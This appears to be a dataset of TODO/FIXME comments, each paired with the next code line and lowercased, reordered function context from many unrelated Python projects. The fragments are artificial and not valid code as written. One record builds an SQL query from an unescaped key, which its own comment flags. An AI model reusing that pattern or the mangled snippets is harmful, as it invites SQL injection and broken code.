# todo / fixme : to be actually implemented later .... </s> raise notimplementederror	test_permission_app_propagation_on_ssowat def test_permission_app_propagation_on_ssowat(): app_install("./tests/apps/permissions_app_ynh", args="domain=%s&path=%s&is_public=1&admin=%s" % (maindomain, "/urlpermissionapp", "alice"), force=True)
# todo: check against cygwin before removing </s> environment_id = files[0]	init_pexpect_session_environment shutit.fail('Wrong number of files in environment_id_dir: ' + environment_id_dir) else: environment = shutit.get_shutit_pexpect_session_environment(environment_id) if environment:
#todo: does not keep case </s> ('you', 'you'),	test__plnoun for sing, plur in ( ('about ME', 'about US'), ): self.TODO(p._plnoun(sing), plur)
# todo: cleanup </s> self.asserttrue(result)	test_find_repo result = self.remote.find_repo({"name": "testrepo0"}, self.token)
#todo: once package/file api are merge to contentapi, replace this check with global content_search </s> if pobj['filename'].endswith('.rpm'):	run exit_code = os.EX_DATAERR continue self.package_api.delete(pobj['id']) else:
# todo: self._line_structures is a work-around and this needs </s> if not self._line_structures:	PyparsingSingleLineTextParser self.file_entry = file_entry file_object = file_entry.GetFileObject() raise errors.UnableToParseFile( u'Line structure undeclared, unable to proceed.')
self.assertequal(end, 1) ## todo real = 0 </s> top = output(top_recent.format(**locals()))	test_4090_simple_service_RemainAfterExit out, end = output2(cmd.format(**locals())) logg.info(" %s =>%s\n%s", cmd, end, out) logg.info("\n>>>\n%s", top) self.assertFalse(greps(top, testsleep))
# todo: refactor </s> if call_list == ['tofile']:	_run_call out = f_block.body[:-3] out[-1].target = assign.target getattr_call = guard(get_definition, self.func_ir, func_var) if (self._is_1D_arr(getattr_call.value.name)):
# todo make fetch_result _not_ a pd.dataframe </s> fetch_result = processresult(pd.dataframe({'a': [], 'b': []}))	test_first_row_is_header_zero_rows def test_first_row_is_header_zero_rows(self): result, error = scrapetable.render(pd.DataFrame(), P(first_row_is_header=True),
# todo extend to inputs with shape (n_samples, 1) </s> cover = onedimensionalcover(n_intervals=n_intervals)	test_filter_values_covered_by_interval_union ) def test_filter_values_covered_by_interval_union(filter_values, n_intervals): interval_masks = cover.fit_transform(filter_values) intervals = [filter_values[interval_masks[:, i]]
#todo: check the data! </s> count = 0	test_filtered_multiple_sources pipe_def = self._get_pipe_def("pipe_c1cfa58f96243cea6ff50a12fc50c984.json") p = pipe2py.compile.parse_and_build_pipe(pipe_def, verbose=True) for i in p: count += 1
# todo: support ddof </s> def _impl(df, axis=none, skipna=none, level=none, ddof=1, numeric_only=none):	_impl return hpat.hiframes.pd_dataframe_ext.std_dummy(df)
prng = randomstate() # todo: seed it </s> r_jump, r_op = prng.rand(2)	_spdpsolve_single_trajectory states_list = [] phi_t = np.copy(psi_t) for t_idx, t in enumerate(tlist): if e_ops:
# todo(b/178173737): use tf.math.segment_sum once a fast version is </s> fixed_pv = tf.linalg.matvec(	loss_function calc_groups_float, float_cashflows * calc_discounts_float_leg) calc_groups_fixed, calc_fixed_leg_daycount * calc_fixed_leg_cashflows *
"""@todo: docs. contribution is welcome.""" </s> early_stop = earlystoppingcallback(1)	test_patience1 def test_patience1(): runner = MagicMock() type(runner).stage_name = PropertyMock(return_value="training")
#todo: unit tests </s> user = auth.user	get_all_projects_smart_folder @must_be_logged_in def get_all_projects_smart_folder(auth, **kwargs): contributed = user.node__contributed nodes = contributed.find(
# todo: will need some code for the tabs active terms to work </s> term = self.find_terminal_by_uuid(window_last_active_term_mapping[window].urn)	layout_done for window in self.windows: if window.last_active_term: term.ensure_visible_and_focussed() for window in self.windows:
# todo: use other libraries. </s> def simple_platform():	simple_platform if platform in ['linux', 'linux2']: return 'linux'
# xxx todo: read incrementally to reduce memory usage. </s> data = fileobj.read()	analyze_code_size if opts.grep is not None: name_re = re.compile(opts.grep, re.I) pre_code, data = data.split(MARKER_START_FUNCS, 1) data, post_code = data.split(MARKER_END_FUNCS, 1)
#todo fixme: we need to check that we aren't adding a duplicate </s> claim.addsource(self.source, bot=true)	run if self.source:
# todo(crcrpar): make this works </s> func.__doc__ += """	new_func "{} is experimental (from version: {}). " "The interface can change in the future".format(func.__name__, version)) .. note:: Added in version {} as experimental feature. The interface can change in the future.
# todo: fails because of missing svg support </s> for html in [	test_images_1 @assert_no_logs def test_images_1(): '<img src="%s">' % url for url in [ 'pattern.png', 'pattern.gif', 'blue.jpg', 'pattern.svg',
# todo: the assert below fails. </s> assert predictval is not none	test_model_output predictval = output_instance.numpy()[0][0]
# todo: remove in version 3.10 </s> with warnings.catch_warnings(record=true):	test_cannot_read_list_permissions request = factory.get('/', HTTP_AUTHORIZATION=self.credentials['writeonly']) object_permissions_list_view.cls.filter_backends = (DjangoObjectPermissionsFilter,) warnings.simplefilter("always") response = object_permissions_list_view(request)
# todo(b/142684737): the multi-processing api might change. </s> beam_pipeline_args=['--direct_num_workers=%d' % direct_num_workers])	_create_pipeline metadata_connection_config=metadata.sqlite_metadata_connection_config( metadata_path),
# todo verify </s> form = {'ajax': '1'}	topcharts def topcharts(self, payload): req_url = "http://www.google.com/trends/topcharts/category" req = self.ses.post(req_url, params=payload, data=form)
# todo: autosummon option to a specific channel </s> async def _auto_summon(self):	MusicBot if self.config.auto_playlist and as_ok: await self.on_finished_playing(await self.get_player(self._get_owner_voice_channel())) channel = self._get_owner_voice_channel() if channel:
# todo: make sure secret values are masked </s> return self._get_one_by_pack_ref(pack_ref=pack_ref)	get_one Handles requests: GET /configs/<pack_ref>
# todo: use triple factory </s> batch_size = 16	test_rescal model = RESCAL(triples_factory=self.factory) self.assertIsNotNone(model) triples = torch.zeros(batch_size, 3, dtype=torch.long) scores = model.forward_owa(triples)
# todo: make test method </s> ssl             # missing ssl extension?	test_ssl def test_ssl(): import ssl return True
# todo: cleaning of facts should eventually become part of taskresults instead of vars </s> try:	get_vars all_vars = combine_vars(all_vars, _plugins_inventory([host])) all_vars = combine_vars(all_vars, _plugins_play([host])) facts = wrap_var(self._fact_cache.get(host.name, {})) all_vars.update(namespace_facts(facts))
# todo: remove temporary workaround once https://github.com/python-babel/babel/issues/415 has been resolved. </s> babel_415_workaround = description['title']	load self.ui.update_level.clear() for level, description in PROGRAM_UPDATE_LEVELS.items(): self.ui.update_level.addItem(_(babel_415_workaround), level) self.ui.update_level.setCurrentIndex(self.ui.update_level.findData(config.setting["update_level"]))
if not config.testnet:  # todo </s> return	parse def parse (db, tx, message): output = None status = 'valid'
# todo: implement it </s> email = self.request.post.get('email')	PasswordResetHandler return self.render_template('password_reset.html', **params) def post(self): auth_id = "own:%s" % email user = User.get_by_auth_id(auth_id)
# todo is a division by moving avg factor needed for variance? </s> a = scale / np.sqrt(epsilon + variance)	replace_batchnorm_with_affine variance = get_initializer(n.input[4]) epsilon = 1e-5 B = bias - (A * mean) nodes_to_remove += [n]
#todo: implement xml support </s> return "whatever, we don't have xml yet"	create_tenant con.close() elif content == 'application/xml': accept_header = request.header.get('Accept') if accept_header in content_types:
#todo(qos): support all the optional parameters </s> return [policy_obj.to_dict() for policy_obj in	get_policies sorts=None, limit=None, marker=None, page_reverse=False): policy_object.QosPolicy.get_objects(context)]
# todo: should use ".handle_quick_operation" action in the future </s> try:	RequestSession super().__init__(bot, ctx) async def approve(self, remark: str = ''): if self.ctx['request_type'] == 'friend': await self.bot.set_friend_add_request(**self.ctx,
#todo: check if/where this is used; if not used externally - remove </s> self.marker_detector.marker_min_confidence = value	marker_min_confidence @marker_min_confidence.setter def marker_min_confidence(self, value: float):
# todo: accept only exported keys </s> self.state_set(key, state[key])	state_from_json for key in state:
# todo: check the data! </s> self.asserttrue(len(list(pipe)) > 0)	test_tail pipe_def = self._get_pipe_def(pipe_file) pipe = pipe2py.compile.parse_and_build_pipe(self.context, pipe_def)
# todo: raise an invalidparameters instead and stop using cli_ui in gitlabform.gitlab </s> cli_ui.fatal(	add_ldap_group_link ) except NotFoundException: f"Invalid parameters for LDAP group link for group {group} - {data} ", exit_code=EXIT_INVALID_INPUT,
# todo: move to "worklockeconomics" class #1126 </s> now = testerchain.w3.eth.getblock(block_identifier='latest').timestamp	test_token_deployer with pytest.raises(BaseContractRegistry.UnknownContract): WorkLockAgent(registry=test_registry) start_bid_date = now + (60 * 60)  # 1 Hour end_bid_date = start_bid_date + (60 * 60)
#todo: how to handle language change? clear and populate again? </s> month = datetime.date(2000, i, 1).strftime('%b')	initialize self._months_nums = dict() for i in xrange(1, 13): self.add_to_store(self._monthsStore, month) self._months_nums[month] = i
# todo hack! include image digest, needed for the downstream notifications handler </s> if 'image_digest' not in curr_evaluation_result:	perform_policy_evaluation raise err curr_final_action = curr_evaluation_result.get('final_action', '').upper() curr_evaluation_result['image_digest'] = imageDigest evalId = hashlib.md5(':'.join([policyId, userId, imageDigest, fulltag, str(curr_final_action)]).encode('utf8')).hexdigest()
# todo: fix with stubber / before send event </s> with mock.patch('botocore.endpoint.endpoint._send') as _send:	test_unsigned_payload with mock.patch('botocore.auth.datetime') as _datetime: _datetime.datetime.utcnow.return_value = timestamp _send.return_value = mock.Mock( status_code=200, headers={}, content=b'{}')
# todo: remove when bug 862603 lands. </s> d['summary'] = list(set(s for _, s in translations[obj.summary_id]))	extract_document 'count': obj.total_reviews, } d['support_email'] = (unicode(obj.support_email) if obj.support_email else None)
'i': ('i', [{'j': 'j'}]),  # todo: support true for cases when the value should simply be mapped into the field name? </s> 'n': ('n', lambda n: n.upper()),	test_initial_integration 'name': 'example.mapping.key.name',  # test object access 'e': 'd.e',  # d.e[0] or d.e: (callable to fetch 0) 'p': Coalesce('xxx', 'yyy',
# todo aggregation only supports # of docs matching </s> for sub_col in get_expanded_column_config(self.config, report_column, 'en').columns:	_get_aggregated_results for report_column in self.column_configs: if report_column.type == 'expanded': r[sub_col.ui_alias] = row[sub_col.es_alias]['doc_count'] elif report_column.field == self.aggregation_columns[0]:
# todo: import refactor - figure out which group this needs :( </s> self.les_grp = e_group()	__init__ self.shipBrowserWorkerThread.start() self.customGroups = set() self.les_grp.ID = -1 self.les_grp.name = "Limited Issue Ships"
# todo: fix this issue </s> self.assertequal(str(np.amin(samples)), '-0.1')	test_single_channel augmenter = Compose([Clip(a_min=-0.1, a_max=0.1, p=1.0)]) samples = augmenter(samples=samples, sample_rate=sample_rate) self.assertEqual(str(np.amax(samples)), '0.1') self.assertEqual(samples.dtype, np.float32)
# @todo: move this to link table? </s> self.gis_location_id(),	S3ContentModel widget = s3_richtext_widget, label=T("Body")), self.pr_person_id(label=T("Contact"), readable = False,
# todo: check syntax, values? </s> values = [v.lower() for v in values]	content_encoding @GenericHeaderSyntax def content_encoding(self, name, values): return values
# todo: if self.outputs["edge indices"].islinked: edgeindices = loft.calcedgeindices() </s> if self.outputs["polygon indices"].islinked: polygonindices = loft.calcpolygonindices()	execute_Linear if valid: if self.outputs["Vertices"].isLinked: vertices = loft.calcVertices() if vertices is None: vertices = Vector3DList() if edgeIndices is None: edgeIndices = EdgeIndicesList()
# # todo: delete when 0.4.0 is available </s> return {}	_info def _info(self):
# todo: header fields might vary across file types, thus prior sensing would be needed </s> header_fields = header_list[0].keys()	process_file if opts.header_fields: if opts.header_fields == 'all': else: header_fields = opts.header_fields.split(',')
# todo: default to 'next' when redoc 2.0.0 is released. </s> redoc_version = self._app.config.get(	_register_redoc_rule redoc_url = self._app.config.get('OPENAPI_REDOC_URL') if redoc_url is None: 'OPENAPI_REDOC_VERSION', 'latest') if redoc_version == 'latest' or redoc_version.startswith('v1'):
# todo -- parallelize this </s> for current_file in getattr(protocol, subset)():	validate_epoch log_scale=model.logsoftmax) metric = DiarizationPurityCoverageFMeasure() reference = current_file['annotation'] uri = get_unique_identifier(current_file)
# todo implement </s> ret = 1	hook_LCMapStringW }) def hook_LCMapStringW(ql, address, params): return ret
pass  # todo </s> def refresh(self):	refresh
# todo: in the future we'll probably need to keep a request history </s> node.data_requests.delete(id=_req.id)	accept_or_deny_request _req_owner = current_user.verify_key == _req.verify_key if _req and (_can_triage_request or _req_owner):
# todo : an "invalid campaign popup" </s> self.__show_invalid_scenario_file_popup(e)	start_single campaign_info = SavegameManager.get_campaign_info(file = map_file) if not campaign_info: self.show_single(show = 'campaign') scenario = campaign_info.get('scenarios')[0].get('level')
# todo: review why this is now unused </s> evt = spiderfootevent("leaksite_content", res['content'], self.__name__, e)	handleEvent ) is None: continue self.notifyListeners(evt)
# todo type_min/type_max </s> for input_data in [[np.nan, 2., np.nan, 3., np.inf, 1, -1000],	test_series_min return S.min() hpat_func = hpat.jit(test_impl) [8, 31, 1123, -1024], [2., 3., 1, -1000, np.inf]]:
# todo(jakevdp): remove when minimum jaxlib is has extension version 4 </s> self._thread_local_state.enable_x64 = bool(state)	_set_x64_enabled lib.jax_jit.set_enable_x64(bool(state)) else:
# todo(b/141131288): enable test once complex sort is supported on tpu. </s> if (jnp.issubdtype(dtype, jnp.complexfloating)	testSort for axis in (None, *range(len(shape))))) def testSort(self, dtype, shape, axis): and jtu.device_under_test() == "tpu"): self.skipTest("complex sort not supported on TPU")
# todo: add modified date </s> self._storage.store({	wrapper if not details: file_path, file_hash = self._download_and_hash(urls) 'file_hash': file_hash, 'file_path': file_path,
# todo: extract real data length: </s> self._init_handler(buf[9], buf[total_header_length:])	_dissect elif options_length < 0: raise Exception("invalid header length: %d" % options_length) return total_header_length
except exception as err:  # todo: what exception?! (socket error; authentication error; ...?) </s> raise jsonapierror(str(err))	JsonApiRequest try: response = requests.get(self.baseurl + path, header=self.header, auth=self.auth, **kwargs) return JsonApiRequest.json_or_error(response) def post(self, path, data, **kwargs):
#todo: unit tests </s> user = auth.user	get_all_projects_smart_folder @must_be_logged_in def get_all_projects_smart_folder(auth, **kwargs): contributed = user.node__contributed nodes = contributed.find(
# todo: obviously incrementing the rows individually is bad. how </s> for i, word_piece_slice in enumerate(wp_rows):	set_annotations align_sizes = xp.array(align_sizes, dtype="f") wp_weighted = wp_tensor / align_sizes.reshape((-1, 1)) doc.tensor[i] += wp_weighted[word_piece_slice].sum(axis=0) doc.user_hooks["vector"] = get_doc_vector_via_tensor
# todo: add doc string </s> super().__init__(incoming_graph_data, **attr)	StellarGraphBase class StellarGraphBase: def __init__(self, incoming_graph_data=None, **attr): self._node_type_attr = attr.get("node_type_name", GLOBALS.TYPE_ATTR_NAME) self._edge_type_attr = attr.get("edge_type_name", GLOBALS.TYPE_ATTR_NAME)
# todo: add test and check this more throughroughly. </s> if hasattr(layer, "activation"):	contains_activation Check whether the layer contains an activation function. activation is None then we only check if layer can contain an activation. if activation is not None: return layer.activation == keras.activations.get(activation)
# todo: make this test real </s> self.assertis(locator.reader, reader)	test_init__reader locator = Locator(reader)
# todo: wer計算するときに消していい？ </s> wer_mean += compute_wer(ref=str_true.split('_'),	do_eval_cer str_true = re.sub(r'[\'<>]+', '', str_true) str_pred = re.sub(r'[\'<>]+', '', str_pred) hyp=str_pred.split('_'), normalize=True)
# todo: combine with the 'canonicalization' that is part of the gemm optimizer. </s> f(av,bv,cv)	test_dot22scalar f = theano.function([a,b,c],0.2*c *a*T.dot(a,b),mode=mode_blas_opt) topo = f.maker.env.toposort() f = theano.function([a,b,c],c * a*0.2*T.dot(a,b),mode=m2) topo = f.maker.env.toposort()
# todo return empty list if not loaded </s> spotify.error.maybe_raise(self.error)	artists def artists(self): Will always return :class:`None` if the track isn't loaded. if not self.is_loaded: return None
# todo debug </s> print ("sensor rule element with "	_evaluateRuleElementsRecursively + "triggered. Set 'and' rule " + "also to not triggered.") + "remote id '%d' and username '%s' not " % (element.element.remoteSensorId,
# todo: update with misconfigurationexception when auto mode is removed in v1.3 </s> if self.mode == 'auto':	__init_monitor_mode f"`mode` can be auto, {', '.join(self.mode_dict.keys())}, got {self.mode}" ) rank_zero_warn( "mode='auto' is deprecated in v1.1 and will be removed in v1.3."
# todo: rewrite this to use dict in all code and not different independent vars </s> boot_part_size = part_sizes['boot']	run vg_size = disc_size part_sizes = get_part_sizes(vg_size, empty_space_size, gpt_bios_grup_part_size, uefisys_part_size) lvm_pv_part_size = part_sizes['lvm_pv'] swap_part_size = part_sizes['swap']
# todo: collations are not supported, but the default ones needed </s> match = next(filter_[0].itertext()).lower()	_prop_match filter_.remove(filter_[0]) elif filter_[0].tag == _tag("C", "text-match"): value = vobject_item.getChildValue(filter_.get("name").lower()) if value is None:
raise exception  # todo (key not found in columns) </s> if not key_matched:	__init__ break
# todo: use fsevents' sincewhen parameter instead of the current </s> fsmonitor.generate_missed_events(self, path)	__add_dir self.monitored_paths[path].monitoring = False if self.persistent: else: self.pathscanner.initial_scan(path)
# todo: if not default behavior: have to specify in decorator (see design_problems.txt). </s> flat_logits._batch_rank = 0 if self.input_space.time_major is false else 1	_graph_fn_get_state_values_and_logits ) state_value = tf.squeeze(state_value, axis=-1) if self.input_space.has_time_rank: flat_logits._time_rank = 0 if self.input_space.time_major is True else 1
# todo(mattrobenolt): remove servicedelegator check </s> settings.sentry_tsdb in (	validate_snuba settings.SENTRY_SEARCH == 'sentry.search.snuba.SnubaSearchBackend' and settings.SENTRY_TAGSTORE == 'sentry.tagstore.snuba.SnubaCompatibilityTagStorage' and 'sentry.tsdb.redissnuba.RedisSnubaTSDB', 'sentry.utils.services.ServiceDelegator',
# todo: remove the false when enabling the crawler. </s> if result is not false and input_quit_if_vulnerable and false:	main if result is not False: vulnerable_urls.append(result) break Logging.info("Found {} vulnerable URI(s)".format(len(vulnerable_urls)))
#todo: we may want to deal with error nicely </s> logging.debug('api timeout error : ' + api_url)	voip_rates response = requests.get(api_url, auth=(request.user, request.user), timeout=1.0) except requests.exceptions.Timeout: else: api_url = full_url + 'rest-api/voip-rate/?sort_field=%s&sort_order=%s' % (sort_order, order)
raise notimplementederror  # todo </s> def __init__(self, perturbation_function, steps, recompute_analysis=false):	__init__
# todo: skips header parsing </s> iline += 1	read_abaqus_inp pass elif word.startswith('material'): line0 = lines[iline].strip().lower() word = line0.strip('*').lower()
# todo: arrange </s> profile = self.remote.get_item_handle("profile", "testprofilecopy", self.token)	test_rename_profile def test_rename_profile(self): Test: rename a profile object result = self.remote.rename_profile(profile, "testprofile1", self.token) self.assertTrue(result)
#todo basket column. </s> t = {"continuous":"c", "discrete":"d", "string":"string", "basket":"basket"}	save f.write("\t".join([str(j.name) for j in domain_vars])) f.write("\n") f.write("\t".join([t[str(j.var_type)] for j in domain_vars])) f.write("\n")
# todo: fix in detectors. </s> return	draw_eyeball_outline def draw_eyeball_outline(pupil_detection_result_3d): if pupil_detection_result_3d["model_confidence"] <= 0.0: draw_ellipse( ellipse=pupil_detection_result_3d["projected_sphere"],
# todo: this can be formulated more efficiently </s> sqrt_ggn = einsum('bml,bkl->bmk', (sqrt_ggn, x)).contiguous()	weight_diag_ggn X = unfold_func(module)(module.input0) X = X.repeat(num_classes, 1, 1) sqrt_ggn = sqrt_ggn.view(num_classes, batch, module.weight.numel()) sqrt_ggn = einsum('cbk->bkc', (sqrt_ggn, ))
# todo(nzw0301): remove the upper version constraint when the callback supports </s> "pytorch-lightning>=1.0.2,<1.5.0",	get_extras_require "tensorflow-datasets", "pytorch-ignite", "skorch", "catalyst>=21.3",
# todo generator </s> if unavailable_paths:	__call__ dir_lookup=dir_lookup) assert not nondataset_paths, "Somehow broken implementation logic" lgr.warning('ignored non-existing paths: %s', unavailable_paths) results = list(chain.from_iterable(
# todo: systemhistory_user_id </s> )	save systemhistory_old_value = self.previous_analysisstatus.analysisstatus_name, systemhistory_new_value = 'No analysisstatus', systemhistory.save() self.previous_analysisstatus = self.analysisstatus
# todo check more types here </s> raise notimplementederror	__convert_to_bytes return self.output.encode() else:
# todo: varref should store a token instead of a string! </s> return runtime.no_spid	SpanForArithExpr with tagswitch(node) as case: if case(arith_expr_e.VarRef): elif case(arith_expr_e.ArithWord): node = cast(arith_expr__ArithWord, UP_node)
# todo: askr, undocumented! </s> def buttonstateraw( self ):	ButtonStateRaw if self.midi.ReadCheck(): a = self.midi.ReadRaw()
# todo: this is a hack to make a rule know </s> if f.endswith("_none"):	_features_in_state f_slots = defaultdict(set) for f in features: if any(f[: f.rfind("_")] in key for key in state.keys()): return False
# todo: remove one day </s> if bigquery_conn_id:	BigQueryHook location: Optional[str] = None, bigquery_conn_id: Optional[str] = None) -> None: warnings.warn( "The bigquery_conn_id parameter has been deprecated. You should pass "
# todo: fix within gitpython or build a fully functional </s> self.repo.git.fetch(rm.name, refspec,	fetch with rm.repo.git.custom_environment( GIT_SSH_COMMAND="datalad sshrun"): universal_newlines=True, **kwargs) else:
# todo: fails because of missing svg support </s> expected_at_keywords = [	test_page_style )) def test_page_style(css, widths): at_keyword for at_keyword in [ '@top-left', '@top-center', '@top-right']
# todo: take into account /ipfs/(hash), first check if this is correct fmt </s> if '://' not in path:  # isaipfshash	fetch_remote_index_file_contents def fetch_remote_index_file_contents(path) -> str: path = path.replace('ipfs://', '') print('No scheme in path, assuming IPFS hash and fetching...') try:
#todo has not (clc) </s> .has('.bank 1')	test_move_sprite_minus_five_on_x_with_eight_tiles .and_then('STA $020B') .and_then('STA $0203') .and_then('mario:')
# todo move this to augmenters.size </s> def compute_paddings_to_reach_multiples_of(arr, height_multiple,	compute_paddings_to_reach_multiples_of width_multiple): See :func:`imgaug.imgaug.compute_paddings_for_aspect_ratio` for an
#todo publish don't write </s> sent_sms = models.sentsms.objects.get(id=sent_sms_id)	submit_sm_resp self.r_server.delete(redis_key) log.msg("Mapping transport_msg_id=%s to sent_sms_id=%s" % (transport_msg_id, sent_sms_id)) sent_sms.transport_msg_id = transport_msg_id sent_sms.save()
# todo: remove when new appium is out </s> self.command_executor._commands[command.key_event] = \	_addCommands self.command_executor._commands[Command.GET_APP_STRINGS] = \ ('POST', '/session/$sessionId/appium/app/strings') ('POST', '/session/$sessionId/appium/device/keyevent') self.command_executor._commands[Command.PRESS_KEYCODE] = \
# todo: note that this won't work for nans </s> dem_mask = np.where(dem.ravel() == nodata_in)[0]	detect_nondraining_flats dem = self._input_handler(data, apply_mask=apply_mask, properties=grid_props, ignore_metadata=ignore_metadata, metadata=metadata, **kwargs) a = np.arange(dem.size) top = np.arange(dem.shape[1])[1:-1]
#self.resetacount() #@todo implement </s> else:	prepare if self.api_data["size"] / 1024 > info["trafficleft"]: self.log.info(_("%s: Not enough traffic left" % self.__name__)) self.url = self.api_data["mirror"] return True
# todo: i should make sure to escape single quotes here </s> self._cursor.execute("select value from %s where key='%s'" % (self._name, key))	__getitem__ if not isinstance(key, basestring): raise ValueError("key must be a string") results = self._cursor.fetchall() if len(results) == 0:
# todo: finish this... </s> self.check_page_for_string ( check_str )	add_folder_info_template check_str = "Create a new information template for folder '%s'" % folder_name
# todo: remove need for --no-strict-optional </s> driver.add_mypy_modules('stdlibsamples (%s)' % (version,), modules,	add_stdlibsamples modules.append(module) if modules: cwd=stdlibsamples_dir, extra_args=['--no-strict-optional'])
# todo: no testpath exercises this code... </s> log.debug('starting thread...')	target def target(): do_run() log.debug('Thread Complete')
# todo: the logic here for ion concentration setting is in two </s> if len(ion_elts) == 1:	PourbaixDiagram for entry in ion_entries: ion_elts = list(set(entry.composition.elements) - elements_HO) entry.concentration = conc_dict[ion_elts[0].symbol] \ * entry.normalization_factor
# todo candidate for move to system/osi as not btrfs related </s> out, err, rc = run_command([hdparm, '-c', '-q', '/dev/%s' % disk],	get_disk_power_status :return: single word sting of state as indicated by hdparm -C /dev/<disk> and if we encounter an error line in the output we return unknown. throw=False)
# todo: ... </s> pass	test_stopService def test_stopService(self):
# todo(danms) once libvirt has support for lxc hotplug, </s> domxml = virt_dom.xmldesc(libvirt.vir_domain_xml_secure)	detach_volume if FLAGS.libvirt_type == 'lxc': self._detach_lxc_volume(xml, virt_dom, instance_name) self._conn.defineXML(domxml) else:
help='') # todo </s> parser.add_argument(	main '--table', action='store_true', '--minimal', action='store_true',
# todo(b/197746608): finds a safer way of reconstructing the metric, </s> keras_metric = none	finalize_metric def finalize_metric(metric: tf.keras.metrics.Metric, values): try: keras_metric = type(metric).from_config(metric.get_config())
# todo: implement </s> return patches	graphics_angle_upgrade :rtype: list patches = []
# todo(elliot): what info do we need for this recipe type? </s> pass	handle_app_input pass if recipes[i]["name"] == "absolute": if recipes[i]["name"] == "sccm": pass
# todo: figure out how to best show this kind of warning to the </s> st.warning('streamlit cannot hash an object of type %s.' % type(obj))	_to_bytes return pickle.dumps(obj, pickle.HIGHEST_PROTOCOL) except Exception:
# todo: another solution should be used here. this is a hack for compatibility reasons. to resolve the gadget address calculation of segments of elf files have a different base address if calculated segment.virtualaddress - segment.offset </s> offset = section.offset - (binary.imagebase - (section.virtualaddress - section.offset))	_searchGadgetsSingle toReturn = [] code = bytes(bytearray(section.bytes)) arch = binary.arch max_progress = len(code) * len(arch.endings[gtype])
# todo: take care of theano to keras port: </s> ))	vgg16 net["conv_4_pool"], 3, "conv_5", 512, activation=activation, net["conv_flat"] = keras.layers.Flatten()(net["conv_5_pool"]) net["dense_1"] = base.dense_layer(net["conv_flat"], units=4096,
# todo: this should be solved via plugins </s> alter_foreignkey_to_int('recipes_oldrecipearticleredirect', 'new_id')	alter_self_foreignkeys alter_foreignkey_to_int('articles_articlecontents', 'article') if 'recepty.recipes' in settings.INSTALLED_APPS:
# todo dm: once we do distributed launching, this needs to be done per node not per cluster </s> telemetry.mergeparts(self.cfg, self.metrics_store),	start logger.info("Starting a cluster based on car [%s] with [%d] nodes." % (car, car.nodes)) cluster_telemetry = [ telemetry.EnvironmentInfo(self.cfg, es, self.metrics_store), telemetry.NodeStats(self.cfg, es, self.metrics_store),
# todo: return errors in a universal way </s> print("shivyc: error: no such file or directory: '{}'"	main c_file = open(arguments.file_name) except IOError: .format(arguments.file_name)) return
# todo: implement this here </s> raise notimplementederror	error_analysis def error_analysis(self, session, X, Y):
# todo: test multi-line lambdas </s> self.arcs.add((start, -start))	code_object_Lambda self.arcs.add((-1, start))
# todo: find a way to invalidate the system df cache. </s> final_df = table_df.merge(self.ctxt.system_df,	_show_run self.ctxt.system_df = system_df if table != 'system': on=['datacenter', 'hostname']) \ .dropna(how='any') \
# todo(yanase): which dtype should we use? float or float32? </s> values = np.array(list(self.get_trial(trial_id).intermediate_values.values()), np.float)	get_best_intermediate_result_over_steps def get_best_intermediate_result_over_steps(self, trial_id): return np.nanmin(values)
# todo: copy doesn't really work as expected, i.e., the reference </s> high_hdlr = copy(self.high_hdlr) if self.high_hdlr else handlers.stderr_hdlr()	get_structured_logger if not lggr_name in self.loggers: self.loggers.add(lggr_name) low_hdlr = copy(self.low_hdlr) if self.low_hdlr else handlers.stdout_hdlr() self.update_hdlr(high_hdlr, self.high_level, formatter=formatters.basic_formatter)
if posix and not sunos:  # todo: sunos </s> name1 = unix_socket_path().__enter__()	create_sockets socks.append(bind_socket(socket.AF_INET6, socket.SOCK_STREAM)) socks.append(bind_socket(socket.AF_INET6, socket.SOCK_DGRAM)) name2 = unix_socket_path().__enter__() s1, s2 = unix_socketpair(name1)
# todo: write units tests </s> self._check_signal_dimension_equals_one()	estimate_elastic_scattering_intensity -------- estimate_elastic_scattering_threshold if isinstance(threshold, float): I0 = self.signal_indexer[:threshold].integrate_simpson(-1)
# todo(@awav): check it </s> m.compile()	test_autoflow s.profiling.output_directory = __file__
# todo: for some reason on osx a unix socket cannot be </s> tfile = tempfile.mktemp(prefix=testfile_prefix) if osx else testfn	check def check(type): safe_rmpath(TESTFN) sock = socket.socket(AF_UNIX, type) with contextlib.closing(sock):
# todo: catch and report error if possible </s> self._client._loop.create_task(self._client.send(	_onRequestIntercepted username = getattr(self, '_credentials', {}).get('username') password = getattr(self, '_credentials', {}).get('password') 'Network.continueInterceptedRequest', { 'interceptionId': event['interceptionId'],
#todo resend message + throttling </s> generated_token = totp(self.get_token().seed)	render_next_step if self.steps.current in ['call-verify', 'sms-verify']: method = self.get_form_data('method', 'method') if method == 'call': phone = self.get_form_data('call', 'phone')
# todo: unittest </s> assert(len(roi_specs) == 1)	_proc_block_inplace % (f, roi_specs)) if is_datasetlike(roi_specs): roi_fids = roi_specs.samples[0] else:
print('warning: exception during driver init, {}'.format(ep.name))  # todo: use proper logger </s> return none	safe_load driver = driver_init() except: if driver is None: print('WARNING: driver init returned None, {}'.format(ep.name))  # TODO: use proper logger
# todo change to check for error when the functionality changes. currently acts as though it doesn't exist </s> url = "/api/v2/nodes/?filter[notafield]=bogus"	test_incorrect_filtering_field_logged_in def test_incorrect_filtering_field_logged_in(self): res = self.app.get(url, auth=self.auth_one) node_json = res.json['data']
# todo: raise an error if finaloutputslot has len=0.  that means the user didn't load a batch dataset into the project. </s> opclustertaskworker.input.connect( finaloutputslot )	prepare_node_cluster_operator def prepare_node_cluster_operator(config, cluster_args, finalOutputSlot, secondaryOutputSlots, secondaryOutputDescriptions): opClusterTaskWorker = OperatorWrapper( OpTaskWorker, parent=finalOutputSlot.getRealOperator().parent ) opClusterTaskWorker.RoiString[0].setValue( cluster_args._node_work_ ) opClusterTaskWorker.TaskName.setValue( cluster_args.process_name )
# todo check the op returned a view </s> elif vmap and idx in vmap:	count_running_memory if dmap and idx in dmap: node_memory_saved_by_inplace += v node_memory_saved_by_view += v idx += 1
# todo (@awaelchli): standardize this across all plugins in lightning and lite. related refactor: #7324 </s> return optimizer	_setup_optimizer def _setup_optimizer(self, optimizer: Optimizer) -> Optimizer:
#@todo: move to utils in 0.4.10 </s> def str2int(string):	str2int try: return int(string)
# todo straya </s> async def close_all_stores(self):	WalletStateManager get's excluded from chain because of the reorg. print("Resending...") await self.wallet_store.close() await self.tx_store.close()
# todo: this test actually isn't very useful right now, but it will make sense </s> self.assertequal(optional[int], union[int, none])	test_optional def test_optional(self):
# todo(tonyg/slamm): is this assertion correct? </s> self.assertequalwithintolerance(	testResolve p.join() total_timer.interval('total_time') 700, total_timer.get_interval('total_time'))
